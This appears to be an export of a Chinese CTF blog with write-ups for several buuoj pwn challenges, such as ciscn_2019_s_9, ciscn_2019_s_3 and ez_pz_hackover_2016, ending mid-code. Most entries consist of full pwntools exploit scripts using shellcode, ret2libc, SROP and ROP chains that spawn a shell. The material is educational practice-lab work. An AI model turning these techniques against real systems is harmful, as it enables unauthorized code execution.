    <url>/2020/01/25/ciscn_2019_s_9/</url>
    
    <content type="html"><![CDATA[<img src="/2020/01/25/ciscn_2019_s_9/image-20200124122128279.png" class="" title="image-20200124122128279"><p>啥保护没开，第一时间考虑shellcode</p><img src="/2020/01/25/ciscn_2019_s_9/image-20200124122202333.png" class="" title="image-20200124122202333"><img src="/2020/01/25/ciscn_2019_s_9/image-20200124122235034.png" class="" title="image-20200124122235034"><p>另外leak只有50，leak多才考虑直接走rop</p><img src="/2020/01/25/ciscn_2019_s_9/image-20200124122303684.png" class="" title="image-20200124122303684"><p>尝试过ret2libc,但是怎么都调不出来= =</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor    eax,eax</span><br><span class="hljs-string">push   eax</span><br><span class="hljs-string">push   0x68732f2f #//sh</span><br><span class="hljs-string">push   0x6e69622f # /bin</span><br><span class="hljs-string">mov    ebx,esp</span><br><span class="hljs-string">mov    ecx,eax</span><br><span class="hljs-string">mov    edx,eax</span><br><span class="hljs-string">mov    al,0xb</span><br><span class="hljs-string">int    0x80</span><br><span class="hljs-string">xor    eax,eax</span><br><span class="hljs-string">inc    eax</span><br><span class="hljs-string">int    0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode =asm(shellcode) <span class="hljs-comment">#使用shellcraft.sh打不通，估计是因为太长了</span><br>shell=<span class="hljs-string">&quot;sub esp,0x28;call esp&quot;</span><br>shell =asm(shell)<br>sh.recvuntil(<span class="hljs-string">&quot;&gt;\n&quot;</span>)<br>payload = shellcode.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>payload += p32(<span class="hljs-number">0x8048554</span>) <span class="hljs-comment">#jmp esp</span><br>payload += shell<br>pause()<br>sh.sendline(payload)<br><br></code></pre></td></tr></table></figure><blockquote><p>（1）xorl %eax,%eax ：使用xor指令清空eax，即使eax=0，不可以使用movl 0,%eax，因为会在shellcode中引入’0’，一些存在bufferoverflow的函数，如strcpy()，都是在源字符串中检测’0’，若遇到‘0’，默认为字符串结束，则之后的字符串不会被拷贝。<br>（2）pushl %eax ：将0入栈，标记了”/bin/sh”的结尾，用pushl也可以避免在shellcode中引入’0’<br>（3）pushl 0x68732f2f：传递”/sh”，为了4字节对齐，使用//sh，这在execve()中等同于/sh<br>（4）pushl ​0x6e69622f：传递“/bin”，为4个字节。<br>（5）movl %esp,%ebx ：此时esp指向了”/bin/sh”,通过esp将该字符串的值传递给ebx<br>（6）pushl %eax<br>        pushl %ebx ：在栈中构造Name数组，ebx存储了”/bin/sh”字符串的地址，eax中为0，作为Name[1]；<br>（7）movl %esp,%ecx :esp指向构造的Name数组，将其保存在ecx中<br>（8）cdq ：清空edx，edx中存放环境变量，0代表不传递环境变量，也可以使用xorl %edx %edx,但是该指令更长。<br>（9）movb $0x0b,%al<br>         int $0x80：eax存储系统调用号11（0x0b）,int指令调用系统调用</p><p>————————————————<br>版权声明：本文为CSDN博主「hhhnoone」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_40712959/article/details/103832987">https://blog.csdn.net/qq_40712959/article/details/103832987</a></p></blockquote><hr><p>调不出来的如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_s_9&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./ciscn_s_9&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&#x27;/home/robye/Desktop/PWN/libc/32-libc-2.27.so&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&quot;&gt;\n&quot;</span>)<br>    pop2_ret = <span class="hljs-number">0x080485da</span><br>    payload = cyclic(<span class="hljs-number">36</span>)<br>    payload += p32(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    payload += p32(<span class="hljs-number">0x80484BB</span>)<br>    payload += p32(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>    <span class="hljs-comment">#payload += p32(0x8048559)</span><br>    <span class="hljs-comment">#payload += p32(0x80484BB)</span><br>    <span class="hljs-comment">#pause()</span><br>    sh.sendline(payload)<br>    <br>    sh.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)<br>    __libc_start_main = u32(sh.recv(<span class="hljs-number">4</span>))<br>    libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    binsh = libc + lib.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>).<span class="hljs-built_in">next</span>()<br>    <br>    sh.recvuntil(<span class="hljs-string">&quot;&gt;\n&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">36</span>)<br>    <span class="hljs-comment">#payload += p32(0x08048359)</span><br>    <span class="hljs-comment">#payload += p32(0x080485da)#pop_rdi_ebp</span><br>    payload + p32(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment">#payload += p32(system)</span><br>    <span class="hljs-comment">#payload += p32(0xdeadbeef) </span><br>    <span class="hljs-comment">#payload += p32(system)</span><br>    <span class="hljs-comment">#payload += p32(0)</span><br>    <span class="hljs-comment">#payload += p32(0xdeadbeef)</span><br>    payload += p32(binsh)<br>    <span class="hljs-comment">#payload += &#x27;cat flag&#x27;</span><br>    <span class="hljs-comment">#payload += p32(0xdeadbeef)</span><br>    payload += p32(system)<br>    pause()<br>    sh.sendline(payload)<br>    <span class="hljs-comment">#__free_hook = libc + lib.symbols[&#x27;__free_hook&#x27;]</span><br>    <span class="hljs-comment">#__malloc_hook = libc + lib.symbols[&#x27;__malloc_hook&#x27;]</span><br>    <span class="hljs-comment">#log.success(&quot;libc: &quot; + hex(libc))</span><br>    <span class="hljs-comment">#log.success(&quot;system: &quot; + hex(system))</span><br>    <span class="hljs-comment">#log.success(&quot;binsh: &quot; + hex(binsh))</span><br>    <span class="hljs-comment">#log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br>    <span class="hljs-comment">#log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))</span><br><br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27831</span>,<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SROP-ciscn_2019_s_3</title>
    <link href="/2020/01/23/SROP-ciscn_2019_s_3/"/>
    <url>/2020/01/23/SROP-ciscn_2019_s_3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/network/87447.html">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></p><p><a href="https://blog.csdn.net/github_36788573/article/details/103541178">比较详细的WP</a></p><p><a href="https://www.jianshu.com/p/ca4a5dacd1a2">https://www.jianshu.com/p/ca4a5dacd1a2</a></p><blockquote><p>两个系统调用，一个是sys_read，一个是sys_write，往栈上写数据（0x400），从栈上读数据（0x30），存在栈溢出。<br>还有一个gadget函数。</p><img src="/2020/01/23/SROP-ciscn_2019_s_3/20191214171639948.png" class="" title="在这里插入图片描述"><p>有两个值得注意的地方。mov rax,0fh 以及mov rax 59。这两个gadget控制了rax的值，看看这两个是什么系统调用。<br>15 sys_rt_sigreturn<br>59 sys_execve</p><p>解法一<br>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。</p><p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p><p>from pwn import *</p><p>io=process(‘pwn’)<br>main=0x0004004ED<br>execv=0x04004E2<br>pop_rdi=0x4005a3<br>pop_rbx_rbp_r12_r13_r14_r15=0x40059A<br>mov_rdxr13_call=0x0400580<br>sys_write=0x00400517</p><p>pl1=’/bin/sh\x00’*2+p64(main)<br>io.send(pl1)<br>io.recv(0x20)<br>sh=u64(io.recv(8))-280<br>print(hex(sh))</p><p>pl2=’/bin/sh\x00’<em>2+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0)</em>2+p64(sh+0x50)+p64(0)*3<br>pl2+=p64(mov_rdxr13_call)+p64(execv)<br>pl2+=p64(pop_rdi)+p64(sh)+p64(sys_write)<br>io.send(pl2)</p><p>io.interactive()</p><p>解法2<br>15号系统调用sigreturn。这个系统调用是在终止信号恢复用户态环境时用的。那么我们在栈上伪造寄存器的值，那么恢复时就可将寄存器控制为我们想要的值。<br>具体可参考：Framing Signals—A Return to Portable Shellcode</p><p>from pwn import *</p><p>io=process(‘pwn’)<br>context.binary=’./pwn’<br>context.terminal = [‘gnome-terminal’,’-x’,’sh’,’-c’]</p><p>main=0x0004004ED<br>sigret=0x4004DA<br>sys_write=0x400517</p><p>pl1=’/bin/sh\x00’*2+p64(main)<br>io.send(pl1)<br>io.recv(0x20)<br>sh=u64(io.recv(8))-280 #sh值为binsh所在的位置<br>print(hex(sh))</p><p>frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = sh<br>frame.rsi = 0<br>frame.rdx = 0<br>frame.rip = sys</p><p>pl1=’a’*16+p64(sigret)+p64(sys_write)+str(frame)</p><p>‘’’<br>def debug(addr):<br>   raw_input(‘debug:’)<br>   gdb.attach(io, “b *” + addr)<br>debug(‘0x400514’)<br>‘’’</p><p>pl2=’/bin/sh\x00’*2+p64(sigret)+p64(sys_write)+str(frame)<br>io.send(pl2)</p><p>io.interactive()<br>————————————————<br>版权声明：本文为CSDN博主「yudhui」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/github_36788573/article/details/103541178">https://blog.csdn.net/github_36788573/article/details/103541178</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_ne_5-骚骚的小东西</title>
    <link href="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/"/>
    <url>/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/</url>
    
    <content type="html"><![CDATA[<img src="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122326853.png" class="" title="image-20200120122326853"><img src="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122344691.png" class="" title="image-20200120122344691"><p>输入之后，在调用getflag这里会造成溢出</p><img src="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122455793.png" class="" title="image-20200120122455793"><p>函数里调用有system，但没有/bin/sh</p><p>骚东西：<img src="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122604385.png" class="" title="image-20200120122604385"></p><p>0x80482E6 + 0x4就是 sh</p><p>我们可以system(“sh”)也可以</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br><span class="hljs-comment">#sh = process(&#x27;ciscn_2019_ne_5&#x27;)</span><br>sh = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27887</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_ne_5&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)<br><br>pop_ret = <span class="hljs-number">0x08048455</span><br>sh.sendline(<span class="hljs-string">&quot;administrator&quot;</span>)<br>system = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = (<span class="hljs-number">0x80482E6</span> + <span class="hljs-number">0x4</span>)<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>payload = cyclic(<span class="hljs-number">0x48</span>)<br>payload += p32(pop_ret)<br>payload += p32(system)<br>payload += p32(<span class="hljs-number">0xdeadbeef</span>)<br>payload += p32(binsh)<br><span class="hljs-comment">#pause()</span><br>sh.sendline(payload)<br>sh.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ez_pz_hackover_2016-继续深入学习edb</title>
    <link href="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/"/>
    <url>/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/</url>
    
    <content type="html"><![CDATA[<img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225637137.png" class="" title="image-20200118225637137"><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225650607.png" class="" title="image-20200118225650607"><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225709949.png" class="" title="image-20200118225709949"><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225720760.png" class="" title="image-20200118225720760"><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225751402.png" class="" title="image-20200118225751402"><p>得先绕过result的strcmp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">sh.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>payload = <span class="hljs-string">&quot;crashme&quot;</span><br>payload = payload.ljust(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>payload += cyclic(<span class="hljs-number">200</span>)<br>pause()<br>sh.sendline(payload)<br></code></pre></td></tr></table></figure><p>pause时，打开edb并attach ez_pz_hackover_2016</p><p>我常用：f8单步运行，ctrl+f9直接跳到ret，shift+f7进入函数运行</p><blockquote><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118230956502.png" class="" title="image-20200118230956502"></blockquote><p>一直运行到不能运行</p><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118230622786.png" class="" title="image-20200118230622786"><p>计算得偏移为16。</p><p>然后，一开始给出了&amp;s的地址，加上没有打开nx。我们就可以在memcpy，溢出之后，将返回指针指向&amp;s里的shellcode</p><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118231945729.png" class="" title="image-20200118231945729"><p>一直运行到vuln的ret之后，我们看见了返回地址时0xffb64b7c,然后我们的shellcode在0xffb64b60，所以偏移就是0xffb64b7c-0xffb64b60 = 0x1c </p><p>得exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>sh = process(<span class="hljs-string">&#x27;ez_pz_hackover_2016&#x27;</span>)<br><span class="hljs-comment">#sh = remote(&quot;node3.buuoj.cn&quot;,27058)</span><br>elf = ELF(<span class="hljs-string">&quot;./ez_pz_hackover_2016&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/ld-linux.so.2&quot;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&quot;crash: &quot;</span>)<br>s_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>payload = <span class="hljs-string">&quot;crashme&quot;</span><br>payload = payload.ljust(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>payload += cyclic(<span class="hljs-number">16</span>)<br>payload += p32(s_addr - <span class="hljs-number">0x1c</span>)<br>payload += asm(shellcraft.sh())<br>pause()<br>sh.sendline(payload)<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure><p>还有种ret2libc的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br><span class="hljs-comment">#sh = process(&#x27;ez_pz_hackover_2016&#x27;)</span><br>sh = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29601</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ez_pz_hackover_2016&quot;</span>)<br><span class="hljs-comment">#lib = ELF(&quot;/lib/ld-linux.so.2&quot;)</span><br>lib = ELF(<span class="hljs-string">&quot;/home/mrbelieve/Desktop/PWN/buu/libc/32-libc-2.23.so&quot;</span>)<br>chall_addr = <span class="hljs-number">0x8048603</span><br>sh.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>payload = <span class="hljs-string">&quot;crashme&quot;</span><br>payload = payload.ljust(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>payload += cyclic(<span class="hljs-number">16</span>)<br>payload += p32(elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>])<br>payload += p32(chall_addr) <br>payload +=  p32(elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>])<br>sh.sendline(payload)<br><br>sh.recvuntil(<span class="hljs-string">&quot;crashme!\n&quot;</span>)<br>printf_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&quot;printf_addr ----&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(printf_addr))<br>libc = printf_addr - lib.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc ----&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br>system = lib.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + libc<br>binsh = lib.search(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>).<span class="hljs-built_in">next</span>() + libc<br><br>sh.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>payload = <span class="hljs-string">&quot;crashme&quot;</span><br>payload = payload.ljust(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>payload += cyclic(<span class="hljs-number">16</span>)<br>payload += p32(system)<br>payload += p32(<span class="hljs-number">0xdeadbeef</span>)<br>payload += p32(binsh)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>借鉴:<a href="https://sh1ner.github.io/2019/09/13/buuctf-pwn/#more">[sh1ner’s blog]</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈迁移</title>
    <link href="/2020/01/15/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    <url>/2020/01/15/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    
    <content type="html"><![CDATA[<p>劫持一次流程，覆盖一次ebp</p><p>栈迁移后跳到read</p><p>正常Rop到libc，再rop，再到libc</p><p>rop到libc，由于跳到read上，后面可以继续任意地址跳转</p><p>pop_ret</p><p>leave_ret  </p><p>payload += elf.plt[‘puts’]</p><p>payload += p32(pop_ebp_ret)</p><p>payload += p32(elf.got[“__libc_start”])</p><p>payload += addr</p><p>payload += p32(leave_ret)</p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109225539782.png" alt="image-20200109225539782"></p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109225754002.png" alt="image-20200109225754002"></p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109225805110.png" alt="image-20200109225805110"></p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109231149390.png" alt="image-20200109231149390"></p><p>没调用函数，函数的got值指向用户代码段，若被执行过会指向libc该函数的</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>常用</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROPgadget-not_the_same_3dsctf_2016</title>
    <link href="/2020/01/14/ROPgadget-not_the_same_3dsctf_2016/"/>
    <url>/2020/01/14/ROPgadget-not_the_same_3dsctf_2016/</url>
    
    <content type="html"><![CDATA[<p><code>ROPgadget --binary not_the_same_3dsctf_2016 --ropchain</code></p><p>自动生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>p = <span class="hljs-string">&#x27;&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08048b0b</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805586b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08048b0b</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805586b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span 